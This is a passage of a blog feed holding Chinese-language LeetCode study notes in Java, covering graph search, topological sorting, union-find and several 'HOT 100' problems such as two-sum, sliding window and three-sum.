class="keyword">while</span>(!queue.isEmpty())搜索它的所有连通区域，这是广度优先图搜索的通式。</span><br></pre></td></tr></table></figure><h3 id="107、矩阵中的距离（542、11月20日）"><a href="#107、矩阵中的距离（542、11月20日）" class="headerlink" title="107、矩阵中的距离（542、11月20日）"></a>107、矩阵中的距离（542、11月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，广度优先搜索+层长度。遍历到某节点时，如果值不为<span class="number">0</span>，就通过getLen求得到最近的<span class="number">0</span>的距离，并将result的对应位置设为该距离。getLen的逻辑，就是通过队列deque广度优先遍历时，记录每层长度，如果访问完一层的节点，就将Len值加一，并更新层长度为当前deque.size。访问节点遇到合法节点且为<span class="number">0</span>时，返回当前Len，只合法则将其加入deque。结果是因为超时倒在倒数第二个测试用例。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，广度优先搜索。这道题解的想法，巧妙之处在把<span class="number">0</span>看得更重要，并不是遇到<span class="number">1</span>时再找最近的<span class="number">0</span>。首先将双层<span class="keyword">for</span>遍历图，将所有<span class="number">0</span>的位置(i,j)都放入队列，并设置visited[i][j]=<span class="literal">true</span>。当deque不为空时，弹出队列头部节点，并搜索其四个方向位置，如果某位置没有被访问过，则有如下公式：</span><br><span class="line">result[row][column] = result[position[<span class="number">0</span>]][position[<span class="number">1</span>]] + <span class="number">1</span>;</span><br><span class="line">看到这里就会明白，最开始队列全部是<span class="number">0</span>，然后与这些<span class="number">0</span>相邻的位置会被设为<span class="number">1</span>，再一层相邻的位置再此基础上继续加一。就像涟漪一样不断扩散到最远的<span class="number">1</span>。（关键词，所有<span class="number">0</span>的队列+涟漪加一）</span><br></pre></td></tr></table></figure><h3 id="109、开密码锁（752、11月20日）"><a href="#109、开密码锁（752、11月20日）" class="headerlink" title="109、开密码锁（752、11月20日）"></a>109、开密码锁（752、11月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，广度优先搜索。首先维护两个HashSet，deadends记录死亡字符串，visited记录访问过的字符串，维护队列Deque&lt;String&gt;准备进行BFS。 </span><br><span class="line">    <span class="keyword">while</span>(!deque.isEmpty())，首先获取deque.size，通过<span class="keyword">for</span>(size)遍历每层节点，对于每个字符串，枚举它改变一个字符后的相邻字符串集合；</span><br><span class="line">    遍历相邻字符串集合，将相邻字符串放入visited和deque，如果等于目标则返回层次深度；否则在所有结束返回-<span class="number">1</span>；</span><br><span class="line">特殊情况是，<span class="string">&quot;0000&quot;</span>是target则返回<span class="number">0</span>，<span class="string">&quot;0000&quot;</span>是死亡字符串则返回-<span class="number">1</span>。</span><br><span class="line"><span class="number">2.</span>这道题挺经典的，它提供了两个做图BFS的技巧。</span><br><span class="line">a.队列实现对路径长度的计数(size就是每层节点的数目，它能区分层次)：</span><br><span class="line"><span class="keyword">while</span>(!deque.isEmpty())&#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> deque.size();</span><br><span class="line">        step ++;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">temp</span> <span class="operator">=</span> deque.remove();</span><br><span class="line">            ...</span><br><span class="line"><span class="comment">//操作该节点并将其相邻节点加入队列</span></span><br><span class="line">            ...</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    b.替换String中的某一位，<span class="type">char</span>计算公式：</span><br><span class="line">    <span class="type">char</span> <span class="variable">temp</span> <span class="operator">=</span> strArray[i];</span><br><span class="line">    strArray[i] = temp==<span class="string">&#x27;0&#x27;</span>?<span class="string">&#x27;9&#x27;</span>:(<span class="type">char</span>)(temp-<span class="number">1</span>);</span><br><span class="line">    result.add(<span class="keyword">new</span> <span class="title class_">String</span>(strArray));</span><br></pre></td></tr></table></figure><h3 id="110、所有路径（797、11月20日）"><a href="#110、所有路径（797、11月20日）" class="headerlink" title="110、所有路径（797、11月20日）"></a>110、所有路径（797、11月20日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，深度优先遍历。因为这道题说明图为无环图，必然是要穷举所有情况，可设dfs函数如下，首先将i添加到result，再遍历graph[i]中每个num，继续 dfs(num)，并回溯删除该num。当i等于（n-<span class="number">1</span>）时，可把当前result放入结果集results。</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] graph,List&lt;List&lt;Integer&gt;&gt; results,List&lt;Integer&gt; result,<span class="type">int</span> i,<span class="type">int</span> n)</span></span><br></pre></td></tr></table></figure><h3 id="111、计算除法（399、11月21日）"><a href="#111、计算除法（399、11月21日）" class="headerlink" title="111、计算除法（399、11月21日）"></a>111、计算除法（399、11月21日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，广度优先遍历。这道题看着题解抄了一小时，抄的云里雾里的。思路很简单，就是先通过equations画权重图，画成邻接表的形式List&lt;List&lt;Pair&gt;&gt;，其中Pair类保存index（表示去向点），value（表示这条边权重）。然后对queries中的每个查询进行计算，如果查询的两个数值都是已经出现的变量，就计算传播权重，查询方法是队列实现BFS。</span><br><span class="line">    其中判断条件 <span class="keyword">while</span>(!points.isEmpty()&amp;&amp;ratios[vb]&lt;<span class="number">0</span>) 比较特殊，是因为ratios初始化为负值，当节点被传播到时修正为正直。</span><br><span class="line"><span class="number">2.</span>代码老长惹好累，希望下次能刷地做出来。</span><br></pre></td></tr></table></figure><h3 id="113、课程顺序（210、11月22日-29日）"><a href="#113、课程顺序（210、11月22日-29日）" class="headerlink" title="113、课程顺序（210、11月22日-29日）"></a>113、课程顺序（210、11月22日-29日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这两三周开始分析OpenRASP源码，准备做成面试项目，导致出现了经典的“研究-安全-Leetcode”纠结问题，大约半个多月没认真碰LeetCode了，接下来还是坚持轻松一点每天一道吧。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，拓扑排序。拓扑排序能保证，任意一条边的起始节点一定排在终止节点的前面，因此拓扑排序得到的序列与先修顺序一定不会存在冲突，问题转变为如何求有向图的拓扑排序序列。</span><br><span class="line">    首先通过hashMap构建邻接表&lt;起始节点，终止节点List&gt;，然后通过题目中“prerequisites先修顺序”填充邻接表并计算每个节点的入度，维护队列deque，将入度为<span class="number">0</span>的节点先填入deque， <span class="keyword">while</span>(!deque.isEmpty())时，弹出节点并获取该节点的终止节点List，将List中每个节点的入度减一，如果减为<span class="number">0</span>则将该终止节点也填入deque。</span><br><span class="line">    最后，如果弹出节点数目为numCourses，则将弹出节点序列返回；否则返回<span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>]。</span><br></pre></td></tr></table></figure><h3 id="115、重建序列（444、11月29日）"><a href="#115、重建序列（444、11月29日）" class="headerlink" title="115、重建序列（444、11月29日）"></a>115、重建序列（444、11月29日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>超序列和子序列是两个相对概念，如果序列A中的所有元素按照先后顺序都在序列B中出现，那么A是B的子序列，B是A的超序列。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，拓扑排序。题目是找到二维数组sequences中满足所有序列的最短的超序列，判断其是否唯一。如果将sequences中每个序列的每个数字视为一个节点，那么边就是相邻数字，从前一数字指向后一数字。我们知道拓扑排序会维护序列先后顺序，构建sequences中所有节点和边组成的图后，查找该有向图的拓扑排序，判断该拓扑排序是否唯一，唯一是通过对照nums判断。</span><br><span class="line"><span class="number">3.</span>这道题解起来很麻烦的地方是，不能简单定义<span class="type">int</span>[n] degrees这样的入度数组，因为nums可能不是最短的，不能以nums的长度为标准。如测试用例，nums=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]，sequences=[[<span class="number">2</span>,<span class="number">3</span>]]。注意索引，其他和第<span class="number">113</span>题课程顺序类似。</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>题解：先维护HashMap&lt;Integer,List&lt;Integer&gt;&gt; graph和HashMap&lt;Integer,Integer&gt; inDegrees，表示该图和入度表，再根据sequences构建graph和inDegrees，然后维护队列queue，将入度为<span class="number">0</span>的数字先填入queue，注意判断条件为 <span class="keyword">while</span>(queue.size()==<span class="number">1</span>)，弹出节点并获取该节点的终止节点List，将List中每个节点的入度减一，如果减为<span class="number">0</span>则将该终止节点也填入deque。最终比较弹出节点顺序和nums是否相同。</span><br><span class="line">    这里 <span class="keyword">while</span>(queue.size()==<span class="number">1</span>)我也想到了，就是每次应该有唯一选择，如果不满足跳出循环，此时弹出节点顺序必然不够nums，从而返回<span class="literal">false</span>。</span><br></pre></td></tr></table></figure><h3 id="116、省份的数量（547、11月30日）"><a href="#116、省份的数量（547、11月30日）" class="headerlink" title="116、省份的数量（547、11月30日）"></a>116、省份的数量（547、11月30日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，广度优先遍历。维护<span class="type">boolean</span>数组visited，<span class="keyword">for</span>循环遍历节点，如果当前节点没有访问过，就调用辅助方法updateVisit访问它的所有连通节点，并设置这些连通节点已经访问（经典queue实现）。因此，主方法<span class="keyword">for</span>循环，每当出现当前节点没访问，说明出现一个省份，就将最终结果加<span class="number">1</span>。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，并查集。第一次学习并查集，感觉有套路吧，难度主要是想到为什么可以使用并查集。并查集解决问题需要实现合并和查找，并维护一个根节点数组，维护每个元素的根节点信息。合并和查找经典代码如下。</span><br><span class="line"><span class="comment">//合并子集</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">union</span><span class="params">(<span class="type">int</span>[] fathers,<span class="type">int</span> i,<span class="type">int</span> j)</span>&#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">fatheri</span> <span class="operator">=</span> findFather(fathers,i);</span><br><span class="line">    <span class="type">int</span> <span class="variable">fatherj</span> <span class="operator">=</span> findFather(fathers,j);</span><br><span class="line">    <span class="keyword">if</span>(fatheri!=fatherj)&#123;</span><br><span class="line">        fathers[fatheri] = fatherj;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//查找根节点并路径压缩</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findFather</span><span class="params">(<span class="type">int</span>[] fathers,<span class="type">int</span> i)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(fathers[i]!=i)&#123;</span><br><span class="line">        fathers[i] = findFather(fathers,fathers[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fathers[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">3.</span>因此，题解就是初始化n个节点，每个节点的根节点为自己，即有n个子集。双层<span class="keyword">for</span>循环，对当前节点的每个直接连通节点，如果这两个节点的根节点不同，则合并子集，并将子集数目n减一。</span><br></pre></td></tr></table></figure><h3 id="118、多余的边（684、11月30日）"><a href="#118、多余的边（684、11月30日）" class="headerlink" title="118、多余的边（684、11月30日）"></a>118、多余的边（684、11月30日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>如果将树看成图，那么一颗有n个节点的树有n-<span class="number">1</span>条边，如果再在树中添加一条边连接任意两个节点，则必然会形成环。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，并查集。初始化n个节点属于n个子集，如果两个节点属于不同的子集，并添加一条边连接它们，就会将它们所在的子集连接在一起，但不会形成环；如果两个节点属于同一子集，同样添加边则会形成环。</span><br><span class="line">    因为edges为[[<span class="number">1</span>,<span class="number">2</span>],[<span class="number">1</span>,<span class="number">3</span>],[<span class="number">2</span>,<span class="number">3</span>]]，遍历每条边，如果这条边两端节点的根节点相同，说明这条边会造成环，返回该边即可。</span><br><span class="line"><span class="number">3.</span>特殊情况，</span><br><span class="line">    a.因为节点是<span class="number">1</span>到N，需维护fathers[n+<span class="number">1</span>]，保证索引和节点编号对应，通过edges遍历，也不会使用到fathers[<span class="number">0</span>]。</span><br><span class="line">    b.注意在合并子集时，是fathers[fatherOfi] = fatherOfj，是根节点的父指针指向另一根节点，而不是当前节点i。</span><br></pre></td></tr></table></figure><h3 id="119、最长连续序列（128、12月1日）"><a href="#119、最长连续序列（128、12月1日）" class="headerlink" title="119、最长连续序列（128、12月1日）"></a>119、最长连续序列（128、12月1日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，哈希表+并查集。这道题思路很巧妙，贴一下大佬的博客。维护hashMap，初始化时以&lt;num,num&gt;填入hashMap，然后进行 union(num,num+<span class="number">1</span>)操作，即如果存在num+<span class="number">1</span>，就将num的根节点设为num+<span class="number">1</span>，然后再次遍历nums，对每个数求find(num)-num+<span class="number">1</span>，并不断通过该结果更新result。这是因为，find(num)会递归查找根节点，则必然找到连续的最大值。但由于nums没有排序，所以需要遍历更新。</span><br><span class="line">大佬的博客：https:<span class="comment">//leetcode.cn/circle/discuss/qmjuMW/。</span></span><br><span class="line">虽然这个解法时间、空间都很慢，但还是很机智，尤其是 union(num,num+<span class="number">1</span>)，是我一直想不到的相邻关系。</span><br></pre></td></tr></table></figure><h3 id="总结之图"><a href="#总结之图" class="headerlink" title="总结之图"></a>总结之图</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>图的定义：图由若干节点及节点之间的边组成，确定图中的节点和边是应用图相关算法解决问题的前提。图可以分为有向图和无向图。图可以用邻接表（链表）或连接矩阵（规整的二维数组，<span class="number">1</span>表示有边，<span class="number">0</span>表示没边）表示。图还可以分为有权图和无权图。</span><br><span class="line"><span class="number">2.</span>图的搜索：找出一条从起始节点到目标结点的路径或遍历所有节点，是与图相关的最重要的算法。</span><br><span class="line">a.广度优先搜索需要一个先进先出的队列，首先将起始节点添加到队列中，接下来每次从队列中取出一个节点，然后将与该节点相邻并且之前还没有到达过的节点添加到队列，重复至所有节点都被访问到。</span><br><span class="line">b.深度优先搜索沿着图中的边尽可能深入地搜索，走不动时开始回溯，回溯遇到每个节点时，就沿着该节点的另一相邻节点继续深入，重复至所有节点都被访问到。</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>广度优先搜索能够保证在无权图中从某个起始节点出发用最短的距离到达目标节点，深度优先搜索则很容易知道从起始节点到达目标节点的路径所经过的所有节点。因此找最短距离适合广度优先，找路径适合深度优先。</span><br><span class="line"><span class="number">4.</span>图中可能存在环，在图中搜索会遇到死循环问题，解决该问题需要记录已经访问过的节点，用visited二维数组记录是一般的方式。</span><br><span class="line"></span><br><span class="line"><span class="number">5.</span>拓扑排序是指对一个有向无环图的节点进行排序之后得到的序列。如果存在一条从节点A指向节点B的边，那么在拓扑排序的序列中节点A出现在节点B的前面。</span><br><span class="line">    节点v的入度指的是以节点v为终点的边的数目，而节点v的出度指的是以节点v为起点的边的数目。</span><br><span class="line">    常用的拓扑排序算法：每次从有向无环图中取出一个入度为<span class="number">0</span>的节点添加到拓扑排序序列中，然后删除该节点及所有以它为起点的边。重复这个步骤，直到图为空或图中不存在入度为<span class="number">0</span>的节点。如果最终图为空，那么图是有向无环图，且找到了拓扑排序序列；如果图不为空并且已经不存在入度为<span class="number">0</span>的节点，那么图中一定有环。</span><br><span class="line"><span class="number">6.</span>拓扑排序材料：入度degrees，出边hashMap&lt;Integer,List&lt;Integer&gt;，qeque入度<span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="number">6.</span>并查集是一种树形数据结构，用来表示不相交集合的数据。并查集中每个子集是一棵树，每个元素是某棵树的一个节点。树中的每个节点有一个指向父节点的指针，树的根节点的指针指向它自己。并查集支持两种操作，即合并和查找。</span><br><span class="line">    合并：将两个子集合并成一个集合，只需要将一个子集对应的树的根节点的指针，指向另一个自己对应的树的根节点。</span><br><span class="line">    查找：从元素v对应的节点开始沿着指向父节点的指针一直找到树的根节点，树的根节点的判断标志是，树的根节点的指针指向它自己。通过查看两个节点所在树的根节点是否相同，从而能判断它们是否属于同一个子集。</span><br><span class="line">    所谓路径压缩，就是对每个节点，重要的信息不是它的父节点，而是它所在子树的根节点，需要在一次查找后记录&lt;该节点，它的根节点&gt;这样的映射关系，从而降低查找的时间复杂度。</span><br><span class="line">    更加通俗易懂的解释在：https:<span class="comment">//blog.csdn.net/weixin_38279101/article/details/112546053</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HOT 100</title>
      <link href="/2022/11/14/HOT-100/"/>
      <url>/2022/11/14/HOT-100/</url>
      
        <content type="html"><![CDATA[<h1 id="Leetcode刷题笔记"><a href="#Leetcode刷题笔记" class="headerlink" title="Leetcode刷题笔记"></a>Leetcode刷题笔记</h1><h2 id="1-两数之和（7月31日）"><a href="#1-两数之和（7月31日）" class="headerlink" title="1.两数之和（7月31日）"></a>1.两数之和（7月31日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="type">int</span>[]型返回值占位 <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line"><span class="number">2.</span>哈希表实现</span><br><span class="line"><span class="comment">//使用哈希表，可以将寻找 target - x 的时间复杂度降低到从O(N)降低到O(1)。</span></span><br><span class="line">    <span class="comment">//思路：把前面的数字和索引放入hashmap中，遍历到后面的数字时只需对hashmap做一次查找</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum2(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hashmap.containsKey(target-nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;hashmap.get(target-nums[i]),i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashmap.put(nums[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-两数相加（7月31日）"><a href="#2-两数相加（7月31日）" class="headerlink" title="2.两数相加（7月31日）"></a>2.两数相加（7月31日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>头插法的起始写法（别用“头部循环外处理+l1.next判断”了，是真的逻辑乱）</span><br><span class="line">    ListNode head=<span class="literal">null</span>,tail=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>(l1!=<span class="literal">null</span>||l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>)&#123;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">        tail = head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>对齐技巧</span><br><span class="line">    <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> l1!=<span class="literal">null</span>?l1.val:<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> l2!=<span class="literal">null</span>?l2.val:<span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="3-无重复字符的最长子串（7月31日、滑动窗口）"><a href="#3-无重复字符的最长子串（7月31日、滑动窗口）" class="headerlink" title="3.无重复字符的最长子串（7月31日、滑动窗口）"></a>3.无重复字符的最长子串（7月31日、滑动窗口）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 花了很长时间没有做出来，我的想法是，维护两个hashMap，分别存储&lt;字母，该字母后的长度&gt;和&lt;字母，该字母的出现位置&gt;，当某个字母判断为重复后，删除该字母及其出现位置以前所有其他字母的hashMap。这样做，倒在了最后两个测试用例，</span><br><span class="line">    分析发现超时原因主要出现在删除该位置以前所有的haspMap，改进增加限制条件“自上一次删除后”，通过测试，击败<span class="number">9.63</span>%哈哈</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>滑动窗口</span><br><span class="line">    滑动窗口就是一个队列，这个队列维护无重复字符的最长子串，每当遇到重复字符时，我们更新队列左端；</span><br><span class="line">    更新队列左端会遇到两种情况，假设重复字符a已经在hashMap中：</span><br><span class="line">    以baba为例，左端更新到第二个b的位置，字符a的位置小于队列左端，说明第一个字符a出现后，其他字符的重复造成左端更新大于第一个a的位置，此时队列左端就需要保持不动；</span><br><span class="line">    以cabab为例，左端更新到c的位置，字符a的位置大于队列左端，说明从c以来，a的重复出现打破了队列维护的无重复子串，此时队列左端就需要更新到a的位置；</span><br><span class="line">    这两种情况，为了维护队列，更新左端都是考虑重复字符第一次出现位置和旧左端谁更大：</span><br><span class="line">    left = Math.max(left,map.get(s.charAt(i)));</span><br><span class="line"></span><br><span class="line">在队列右端向右探索时，右端接触的字符需要更新位置：map.put(s.charAt(i),i+<span class="number">1</span>)；这里加一是因为左端要从hashMap中取，而本字符造成了重复，它的下一位才是不重复的；</span><br><span class="line">    并计算当前维护无重复子串队列的长度：max = Math.max(max,i-left+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>我的思路为什么慢了？</span><br><span class="line">    向右探索时，我是遍历维护的hashMap，为每个元素维护的子串长度加一，并判断是否大于maxValue；当遇到重复元素时，我需要找到该重复元素旧位置以前的其他元素，因为他们的子串因为包含此元素子串，所以要从hashMap中删除这些其他元素。即向右探索存在两个遍历。</span><br></pre></td></tr></table></figure><h2 id="4-寻找两个正序数组的中位数（8月1日）"><a href="#4-寻找两个正序数组的中位数（8月1日）" class="headerlink" title="4.寻找两个正序数组的中位数（8月1日）"></a>4.寻找两个正序数组的中位数（8月1日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>本题一遍过了，就是中位数是两个有序数组中的第 (m+n)/<span class="number">2</span> 个元素和第 (m+n)/<span class="number">2</span> 个元素的平均值，故遍历只需进行到两个数组总长度的中间位置。需要注意一个数组先结束的情况，外层套上数组边界判断，这种情况下只探索另一数组。</span><br><span class="line"><span class="number">2.</span><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=(nums1.length+nums2.length)/<span class="number">2</span>;i++)，这样小于等于的话，如果总长度为奇数，中间位置即为最后元素；如果总长度为偶数，中间位置即为最后两个元素取平均；注意先要把<span class="keyword">for</span>循环i最后多加的<span class="number">1</span>去掉。</span><br></pre></td></tr></table></figure><h2 id="5-最长回文子串（8月6日、动态规划）"><a href="#5-最长回文子串（8月6日、动态规划）" class="headerlink" title="5.最长回文子串（8月6日、动态规划）"></a>5.最长回文子串（8月6日、动态规划）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较困难，甚至暴力破解都想不出来，看题解第一次接触动态规划。动态规划是一种用空间换时间的做法，即把一些子序列的结果保存起来，长序列利用子序列的结果。本题中假设例子是“babac”，已知子序列“aba”的结果为回文，那只需要考虑两端b≠c，即长序列不是回文。</span><br><span class="line"><span class="number">2.</span>因为是从短序列推导长序列，应该外围遍历是序列长度，计算每个位置开始的固定序列长度的结果，遍历长序列时，只需利用dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>];获得长序列的结果。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> L=<span class="number">2</span>;L&lt;=len;L++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line"><span class="number">3.</span>考虑的特殊情况，a.单字符即为回文；b.双字符没有子序列，直接给出结果；c.在每个双层遍历后判断是否大于maxlen且为回文，并记录该序列的起始位置，用于返回裁剪字符串。</span><br></pre></td></tr></table></figure><h2 id="10-正则表达式匹配（8月6日、动态规划）"><a href="#10-正则表达式匹配（8月6日、动态规划）" class="headerlink" title="10.正则表达式匹配（8月6日、动态规划）"></a>10.正则表达式匹配（8月6日、动态规划）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看晕了，DP太难啦</span><br></pre></td></tr></table></figure><h2 id="11-盛最多水的容器（8月6日、双指针）"><a href="#11-盛最多水的容器（8月6日、双指针）" class="headerlink" title="11.盛最多水的容器（8月6日、双指针）"></a>11.盛最多水的容器（8月6日、双指针）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是，用冒泡排序的结构遍历一遍所有可能的情况，更新maxValue，但是超出了时间限制。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line"><span class="number">2.</span>双指针代表的是，可以作为容器边界的所有位置的范围，开始时，左右指针分别指向左右边界。每次计算容量后，只移动一个指针，且移动高度更低的指针。</span><br><span class="line">这是因为，假设指针距离为t，此时右指针位置桶壁更高，则容量为min(x,y)*t=x*t,</span><br><span class="line">假设向左移动右指针，指针距离t-<span class="number">1</span>，min(x,<span class="keyword">new</span> <span class="title class_">y</span>)&lt;=x,则此时min(x,<span class="keyword">new</span> <span class="title class_">y</span>)*(t-<span class="number">1</span>)&lt;x*t,</span><br><span class="line">说明这种移动没有任何意义，从这种移动出发找不到比当前位置更高的容量，所以移动的条件是移动更低桶壁的指针位置。</span><br><span class="line">结束的条件是，因为是每次只移动一个指针，即两个指针最终不能指向同一位置。<span class="keyword">while</span>(left!=right)</span><br><span class="line"><span class="number">3.</span>双指针算法没超过时间限制的原因是，一直在剔除不可能的情况。时间复杂度为O(N)，只需遍历数组一次。</span><br></pre></td></tr></table></figure><h2 id="15-三数之和（8月7日、排序-双指针）"><a href="#15-三数之和（8月7日、排序-双指针）" class="headerlink" title="15.三数之和（8月7日、排序+双指针）"></a>15.三数之和（8月7日、排序+双指针）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是三重循环，运行后发现还需要编写去重，那铁定得超时了。查看题解说三重循环+哈希去重是一般想法，肯定会超时，这里哈希去重指的是哪种操作呢？</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：如果数组是有序的，枚举到的三元组(a,b,c)满足a&lt;=b&lt;=c,保证了内容(a,b,c)不会以(b,a,c)、(c、a、b)等其他顺序出现，故数组应该有序。此外，如果满足“对每一重循环而言，相邻两次枚举的元素不能相同”，即每个数字都有代表元，三重循环每一重不会遍历到相同元素，不同层会遍历到同一元素，但序列递增导致序列不同，这样就彻底做到去重。</span><br><span class="line">Arrays.sort(nums); <span class="comment">//无需返回值的数组排序</span></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  <span class="comment">//结果数组的定义</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;      <span class="comment">//每层遍历范围的衔接，因为等于i+1，或者后面式子不等于才该遍历</span></span><br><span class="line">        <span class="keyword">if</span>(j&gt;i+<span class="number">1</span> &amp;&amp; nums[j] == nums[j-<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> j + <span class="number">1</span>; k &lt; nums.length; k++)&#123; </span><br><span class="line">但是，这种算法还是会导致运行超时，时间复杂度仍然是O(N^<span class="number">3</span>)。</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>：当固定第<span class="number">1</span>重循环元素i后，第<span class="number">2</span>、<span class="number">3</span>重循环就会存在并列关系，和为(<span class="number">0</span>-nums[i])。这样随着第<span class="number">2</span>重循环元素严格递增，势必存在第<span class="number">3</span>重循环元素严格递减，那么就可以用双指针，左指针右移，右指针左移，导致整体需要遍历元素数目减少。</span><br><span class="line">  a.我的实现： <span class="keyword">while</span>(j&lt;k)为外层，当nums[j] + nums[k] &lt; target时将左指针右移，&gt;target时将右指针左移，=target时记录位置并将两个指针同时移动；需要处理的特殊情况是，当同层循环遍历相同元素时应<span class="keyword">continue</span>，故有两个<span class="keyword">continue</span>判断。</span><br><span class="line">  b.Leetcode的实现：<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">second</span> <span class="operator">=</span> first + <span class="number">1</span>; second &lt; n; ++second)为外层，即以second为基准，相比我的优化是，当&gt;target时一直将右指针左移，即能在到一个second时就最大限度降低右指针，到下一个second时third也足够小。</span><br><span class="line">      <span class="keyword">while</span> (second &lt; third &amp;&amp; nums[second] + nums[third] &gt; target) 